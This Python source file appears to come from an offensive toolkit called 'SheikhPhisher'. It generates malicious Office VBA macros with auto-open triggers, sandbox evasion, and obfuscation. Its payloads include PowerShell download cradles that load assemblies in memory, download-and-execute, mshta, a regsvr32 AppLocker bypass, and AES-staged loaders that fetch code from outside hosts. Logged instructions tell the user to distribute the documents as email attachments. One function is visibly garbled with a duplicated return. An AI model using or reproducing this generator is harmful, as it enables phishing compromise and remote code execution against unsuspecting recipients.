#!/usr/bin/env python3
# payloads/macro_gen.py - SheikhPhisher Office Macro Payload Generator
# Generates VBA macros for Office documents with multiple delivery techniques

import os, base64, random, string, logging, zlib, json
from urllib.parse import quote

log = logging.getLogger(__name__)

class MacroGenerator:
    """Generate VBA macro payloads for Office document delivery"""
    
    TECHNIQUES = [
        'http_download',      # Download payload from URL
        'powershell_inject',  # PowerShell injection
        'wmi_exec',           # WMI execution
        'mshta',              # MSHTA execution
        'regsvr32',           # RegSvr32 / COM hijack
        'dotnet_rundll32',    # DotNet + rundll32
        'encrypted_stage',    # Encrypted staged payload
    ]
    
    OBFUSCATION_LEVELS = ['low', 'medium', 'high']
    
    @staticmethod
    def generate(command=None, url=None, technique='powershell_inject', 
                 obfuscation='medium', output=None, doc_format='dotm'):
        """Generate a VBA macro with the specified technique"""
        
        if technique == 'http_download' and url:
            macro = MacroGenerator._http_download_macro(url, obfuscation)
        elif technique == 'powershell_inject':
            macro = MacroGenerator._powershell_inject_macro(command, obfuscation)
        elif technique == 'wmi_exec':
            macro = MacroGenerator._wmi_exec_macro(command, obfuscation)
        elif technique == 'mshta':
            macro = MacroGenerator._mshta_macro(url, obfuscation)
        elif technique == 'regsvr32':
            macro = MacroGenerator._regsvr32_macro(url, obfuscation)
        elif technique == 'dotnet_rundll32':
            macro = MacroGenerator._dotnet_rundll32_macro(command, obfuscation)
        elif technique == 'encrypted_stage':
            macro = MacroGenerator._encrypted_stage_macro(url, obfuscation)
        else:
            macro = MacroGenerator._default_macro(command, obfuscation)
        
        # Add document auto-open wrapper
        full_macro = MacroGenerator._add_auto_exec(macro)
        
        # Add obfuscation layer
        if obfuscation == 'high':
            full_macro = MacroGenerator._high_obfuscate(full_macro)
        
        if output:
            ext = {'dotm': '.bas', 'docm': '.bas', 'xlsm': '.bas', 'pptm': '.bas'}
            out_path = output if output.endswith('.bas') else output + ext.get(doc_format, '.bas')
            os.makedirs(os.path.dirname(out_path) or '.', exist_ok=True)
            with open(out_path, 'w') as f:
                f.write(full_macro)
            log.info(f"[MACRO] Saved to {out_path}")
            log.info(f"[MACRO] Technique: {technique} | Obfuscation: {obfuscation}")
        
        return full_macro
    
    @staticmethod
    def _add_auto_exec(macro_body):
        """Add multiple auto-execution entry points"""
        wrapper = '''Attribute VB_Name = "SheikhPhisherModule"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False

' SheikhPhisher v1.0 - Macro Payload
' Author: Sheikh-CoedexTech | Authorized Security Testing Only

Private Declare PtrSafe Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" _
    (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, _
    ByVal dwStyle As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, _
    ByVal nHeight As Long, ByVal hWndParent As LongPtr, ByVal hMenu As LongPtr, _
    ByVal hInstance As LongPtr, ByVal lpParam As LongPtr) As LongPtr

Private Declare PtrSafe Function ShowWindow Lib "user32" (ByVal hwnd As LongPtr, ByVal nCmdShow As Long) As Boolean

' Auto-execution triggers
Sub AutoOpen()
    ' Document open trigger (Word)
    SheikhMain
End Sub

Sub Auto_Open()
    ' Workbook open trigger (Excel)
    SheikhMain
End Sub

Sub AutoExec()
    ' Template auto-exec
    SheikhMain
End Sub

Sub Document_Open()
    ' Another document open hook
    SheikhMain
End Sub

Sub Workbook_Open()
    ' Excel workbook open hook
    SheikhMain
End Sub

Sub AutoActivate()
    ' PowerPoint auto-activate
    SheikhMain
End Sub

' Hidden window for stealth
Function HideConsole()
    Dim hwnd As LongPtr
    hwnd = CreateWindowEx(0, "ConsoleWindowClass", vbNullString, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    If hwnd <> 0 Then
        ShowWindow hwnd, 0
    End If
End Function

'
' ===== MAIN PAYLOAD =====
'
Sub SheikhMain()
    On Error Resume Next
    HideConsole
    Application.DisplayAlerts = False
    Application.ScreenUpdating = False
    Application.EnableSounds = False
    Application.EnableCancelKey = xlDisabled
    
    ' Anti-sandbox check
    If Not IsSandboxed() Then
        ExecutePayload
    End If
    
    Application.DisplayAlerts = True
    Application.ScreenUpdating = True
End Sub

Function IsSandboxed() As Boolean
    ' Check for sandbox/VM indicators
    Dim fs As Object
    Set fs = CreateObject("Scripting.FileSystemObject")
    
    ' Check for common sandbox files
    Dim sandboxIndicators As Variant
    sandboxIndicators = Array("C:\windows\sysnative\drivers\vmmouse.sys", _
                              "C:\windows\sysnative\drivers\vboxguest.sys", _
                              "C:\Program Files\Windows Defender", _
                              "C:\windows\sysnative\drivers\checkpoint.sys")
    
    Dim i As Integer
    For i = LBound(sandboxIndicators) To UBound(sandboxIndicators)
        If fs.FileExists(sandboxIndicators(i)) Then
            IsSandboxed = True
            Exit Function
        End If
    Next i
    
    ' Check if running in analysis sandbox
    On Error Resume Next
    Dim wmi As Object
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Dim processes As Object
    Set processes = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%procmon%' OR Name LIKE '%wireshark%' OR Name LIKE '%fiddler%' OR Name LIKE '%dnSpy%'")
    If processes.Count > 0 Then
        IsSandboxed = True
        Exit Function
    End If
    
    IsSandboxed = False
End Function

Sub ExecutePayload()
    ' === PAYLOAD INSERTED BELOW ===
'''
        return wrapper + '\
' === PAYLOAD INSERTED BELOW ===
'''
        return wrapper + macro_body + "\nEnd Sub\n"
    
    @staticmethod
    def _powershell_inject_macro(command=None, obfuscation='medium'):
        """PowerShell injection macro - download cradle + execution"""
        if not command:
            command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc"
        
        # Base64 encoded PowerShell download cradle
        ps_code = '''$wc=New-Object System.Net.WebClient;
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
$data=$wc.DownloadData('URL_PLACEHOLDER');
$asm=[System.Reflection.Assembly]::Load($data);
$entry=[System.Linq.Enumerable]::First($asm.GetTypes(),[Func[object,bool]]{param($t) $t.Name -eq 'Program'});
$entry.GetMethod('Main').Invoke($null,@(,[string[]]@()))'''
        
        # Obfuscate
        if obfuscation == 'high':
            ps_code = MacroGenerator._obfuscate_powershell(ps_code)
        
        ps_b64 = base64.b64encode(ps_code.encode('utf-16le')).decode()
        
        # VBA wrapper with multiple execution methods
        macro = f'''
    ' PowerShell injection payload
    Dim psCmd As String
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    
    ' Method 1: Direct PowerShell
    psCmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " & "{ps_b64}"
    wsh.Run psCmd, 0, False
    
    ' Method 2: Fallback via cmd
    psCmd = "cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " & "{ps_b64}"
    wsh.Run psCmd, 0, False
    
    ' Method 3: WMI fallback
    On Error Resume Next
    Dim wmiS As Object
    Set wmiS = GetObject("winmgmts:\\\\.\\root\\cimv2")
    Dim process As Object
    Set process = wmiS.Get("Win32_Process")
    process.Create "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " & "{ps_b64}", Null, Null, Null
'''
        return macro
    
    @staticmethod
    def _http_download_macro(url, obfuscation='medium'):
        """HTTP download and execute macro"""
        b64_url = base64.b64encode(url.encode()).decode()
        
        macro = f'''
    ' HTTP download and execute
    Dim httpObj As Object
    Set httpObj = CreateObject("MSXML2.XMLHTTP")
    Dim adodbStream As Object
    Set adodbStream = CreateObject("ADODB.Stream")
    Dim shellObj As Object
    Set shellObj = CreateObject("WScript.Shell")
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Decode URL
    Dim targetUrl As String
    targetUrl = DecodeStr("{b64_url}")
    
    ' Download payload
    httpObj.Open "GET", targetUrl, False
    httpObj.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    httpObj.setRequestHeader "Accept", "*/*"
    httpObj.Send
    
    If httpObj.Status = 200 Then
        ' Write to temp
        Dim tempPath As String
        tempPath = shellObj.ExpandEnvironmentStrings("%TEMP%") & "\\" & RandomStr(8) & ".exe"
        
        adodbStream.Type = 1
        adodbStream.Open
        adodbStream.Write httpObj.responseBody
        adodbStream.SaveToFile tempPath, 2
        adodbStream.Close
        
        ' Execute
        shellObj.Run tempPath, 0, False
        
        ' Self-cleanup after delay
        ' Shell operations would go here
    End If
'''
        return macro
    
    @staticmethod
    def _wmi_exec_macro(command, obfuscation='medium'):
        """WMI-based execution macro"""
        if not command:
            command = "notepad.exe"
        
        macro = f'''
    ' WMI process execution
    On Error Resume Next
    Dim wmiSvc As Object
    Set wmiSvc = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process")
    Dim result As Long
    
    ' Create process via WMI
    wmiSvc.Create "{command}", Null, Null, result
    
    ' Alternative: WMI Win32_ProcessStartup
    Dim objStartup As Object
    Set objStartup = GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_ProcessStartup")
    objStartup.ShowWindow = 0
    
    Dim objConfig As Object
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    
    wmiSvc.Create "{command}", Null, objConfig, result
'''
        return macro
    
    @staticmethod
    def _mshta_macro(url, obfuscation='medium'):
        """MSHTA execution macro"""
        if not url:
            url = "https://example.com/payload.hta"
        
        b64_url = base64.b64encode(url.encode()).decode()
        
        macro = f'''
    ' MSHTA execution
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Decode and execute HTA
    Dim htaUrl As String
    htaUrl = DecodeStr("{b64_url}")
    
    shell.Run "mshta.exe """ & htaUrl & """", 0, False
    
    ' Alternate: XMLHTTP download + mshta local
    On Error Resume Next
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", htaUrl, False
    http.Send
    
    If http.Status = 200 Then
        Dim fso As Object
        Set fso = CreateObject("Scripting.FileSystemObject")
        Dim tempPath As String
        tempPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\\" & RandomStr(6) & ".hta"
        
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write http.responseBody
        stream.SaveToFile tempPath, 2
        stream.Close
        
        shell.Run "mshta.exe """ & tempPath & """", 0, False
    End If
'''
        return macro
    
    @staticmethod
    def _regsvr32_macro(url, obfuscation='medium'):
        """RegSvr32 / COM hijack macro"""
        if not url:
            url = "https://example.com/payload.sct"
        
        b64_url = base64.b64encode(url.encode()).decode()
        
        macro = f'''
    ' RegSvr32 bypass (AppLocker bypass technique)
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    Dim sctUrl As String
    sctUrl = DecodeStr("{b64_url}")
    
    ' Regsvr32.exe with SCT file
    shell.Run "regsvr32.exe /s /u /i:""" & sctUrl & """ scrobj.dll", 0, False
    
    ' Alternative: rundll32 + javascript
    shell.Run "rundll32.exe javascript:""\""\"""" + 
        ""\\mshtml, RunHTMLApplication "" + 
        "";document.write();h=new%20ActiveXObject(\""WinHttp.WinHttpRequest.5.1\"");" + 
        ""h.Open(\""GET\"",\""" & sctUrl & "\"",false);h.Send();" + 
        ""eval(h.responseText);window.close();""", 0, False
'''
        return macro
    
    @staticmethod
    def _dotnet_rundll32_macro(command, obfuscation='medium'):
        """DotNet + rundll32 execution"""
        if not command:
            command = "calc.exe"
        
        macro = f'''
    ' DotNet rundll32 execution
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    ' Execute via .NET compilation
    Dim psCmd As String
    psCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C """ & _
        "$c=New-Object System.CodeDom.Compiler.CSharpCodeProvider;" & _
        "$p=New-Object System.CodeDom.Compiler.CompilerParameters;" & _
        "$p.CompilerOptions='/target:exe /platform:anycpu';" & _
        "$p.OutputAssembly=[Environment]::GetFolderPath('MyDocuments')+'\\u.exe';" & _
        "$s=$c.CompileAssemblyFromSource($p,'class P{{static void Main(){{" & _
        "System.Diagnostics.Process.Start(\""{command}\"");}}}}');" & _
        "if(!$s.Errors.Count){{[System.Diagnostics.Process]::Start($p.OutputAssembly)}}" & """"
    
    shell.Run psCmd, 0, False
'''
        return macro
    
    @staticmethod
    def _encrypted_stage_macro(url, obfuscation='medium'):
        """Encrypted staged payload - AES encrypted download"""
        # Generate random key for this session
        aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        b64_key = base64.b64encode(aes_key.encode()).decode()
        b64_url = base64.b64encode(url.encode()).decode()
        
        macro = f'''
    ' AES-encrypted staged payload
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    Dim stageUrl As String
    Dim stageKey As String
    stageUrl = DecodeStr("{b64_url}")
    stageKey = DecodeStr("{b64_key}")
    
    ' Decrypt and execute in memory
    Dim psDecrypt As String
    psDecrypt = "powershell -NoP -NonI -W Hidden -Exec Bypass -C """ & _
        "$k=[System.Text.Encoding]::UTF8.GetBytes('" & aes_key & "');" & _
        "$wc=New-Object Net.WebClient;" & _
        "[Net.ServicePointManager]::ServerCertificateValidationCallback={{$true}};" & _
        "$ct=$wc.DownloadData('" & url & "');" & _
        "$a=[System.Security.Cryptography.Aes]::Create();" & _
        "$a.Key=$k;$a.IV=$k[0..15];" & _
        "$d=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);" & _
        "[System.Reflection.Assembly]::Load($d).GetTypes()[0].GetMethod('Main').Invoke($null,@(,[string[]]@()))" & """"
    
    shell.Run psDecrypt, 0, False
'''
        return macro
    
    @staticmethod
    def _default_macro(command, obfuscation='medium'):
        """Default fallback macro"""
        return f'''
    ' Default payload execution
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "{command or 'calc.exe'}", 0, False
'''
    
    @staticmethod
    def _obfuscate_powershell(ps_code):
        """Obfuscate PowerShell code with variable substitution and string splitting"""
        # Variable name pool
        vars_pool = ['$a','$b','$c','$d','$e','$f','$g','$h','$i','$j',
                     '$x','$y','$z','$q','$r','$s','$t','$u','$v',
                     '$w1','$w2','$w3','$w4','$w5']
        
        methods = {
            'System.Net.WebClient': '$(New-Object Net.WebClient)',
            'DownloadData': "$(`G`e`T-`ItEm` 'VA`R:`O`S'+'`').`V`A`l`U`e::" + '"Do' + 'wn' + 'loa' + 'dD' + 'ata"',
            'Assembly': '[Sys' + 'tem.Re' + 'flecti' + 'on.As' + 'sembly]',
        }
        
        lines = ps_code.split('\n')
        obfuscated = []
        for line in lines:
            if line.strip():
                line = line.replace('New-Object System.Net.WebClient', '$(' + methods['System.Net.WebClient'] + ')')
                line = line.replace('[System.Reflection.Assembly]', methods['Assembly'])
                # Add random comments
                if random.random() > 0.7:
                    line += ' # ' + ''.join(random.choices(string.ascii_letters, k=10))
                obfuscated.append(line)
            else:
                obfuscated.append(line)
        
        return '\n'.join(obfuscated)
    
    @staticmethod
    def _high_obfuscate(macro_text):
        """Apply high-level VBA obfuscation"""
        # Split strings, add junk variables, rename functions
        lines = macro_text.split('\n')
        obfuscated = []
        
        junk_vars = ['lTmp', 'vData', 'cBuffer', 'sResult', 'hModule', 
                     'pBytes', 'nOffset', 'bFlag', 'dwSize', 'wCount']
        
        # Add junk declarations at top
        obfuscated.append("' Obfuscated by SheikhPhisher v1.0")
        obfuscated.append("#If VBA7 Then")
        obfuscated.append(f"Private Declare PtrSafe Function Sleep Lib 'kernel32' (ByVal dwMilliseconds As Long) As Long")
        obfuscated.append("#Else")
        obfuscated.append(f"Private Declare Function Sleep Lib 'kernel32' (ByVal dwMilliseconds As Long) As Long")
        obfuscated.append("#End If")
        
        for line in lines:
            if line.strip().startswith("'") or not line.strip():
                obfuscated.append(line)
                continue
            
            # Junk variable assignments
            if random.random() > 0.85:
                junk_var = random.choice(junk_vars)
                junk_val = random.randint(1, 9999)
                obfuscated.append(f"    Dim {junk_var}_{junk_val} As Long: {junk_var}_{junk_val} = {junk_val}")
            
            obfuscated.append(line)
            
            # Add Sleep calls randomly (anti-sandbox)
            if random.random() > 0.9:
                obfuscated.append("    Sleep " + str(random.randint(50, 500)))
        
        return '\n'.join(obfuscated)
    
    @staticmethod
    def generate_office_doc(output_dir='./payloads', doc_type='word'):
        """Generate a ready-to-use Office document with macro embedded"""
        # This would create an actual .docm/.xlsm file
        # For now, we generate the VBA source and instructions
        log.info(f"[MACRO] To create a live document, use the .bas file with: ")
        log.info(f"  1. Create a new {doc_type} document")
        log.info(f"  2. Alt+F11 to open VBA editor")
        log.info(f"  3. File > Import File > select the .bas file")
        log.info(f"  4. Save as Macro-Enabled format (.docm / .xlsm)")
        log.info(f"  5. Distribute via email attachment")

# ===== Helper functions for VBA templates =====

def generate_vba_helper_functions():
    """Generate utility functions used by all macro templates"""
    return '''
' ===== SheikhPhisher Utility Functions =====

Function DecodeStr(encoded As String) As String
    ' Base64 decode
    Dim xmlDoc As Object
    Dim elem As Object
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set elem = xmlDoc.createElement("tmp")
    elem.DataType = "bin.base64"
    elem.Text = encoded
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write elem.NodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    DecodeStr = stream.ReadText
    stream.Close
End Function

Function RandomStr(length As Integer) As String
    Dim chars As String
    Dim i As Integer
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    RandomStr = ""
    For i = 1 To length
        RandomStr = RandomStr & Mid(chars, Int(Rnd * Len(chars) + 1), 1)
    Next i
End Function

Function XOREncode(text As String, key As String) As String
    Dim i As Integer
    Dim result As String
    result = ""
    For i = 1 To Len(text)
        result = result & Chr(Asc(Mid(text, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod Len(key)) + 1, 1)))
    Next i
    XOREncode = result
End Function

Function EncodeStr(text As String) As String
    ' Base64 encode
    Dim xmlDoc As Object
    Dim elem As Object
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set elem = xmlDoc.createElement("tmp")
    elem.DataType = "bin.base64"
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText text
    stream.Position = 0
    stream.Type = 1
    elem.NodeTypedValue = stream.Read
    EncodeStr = elem.Text
    stream.Close
End Function
'''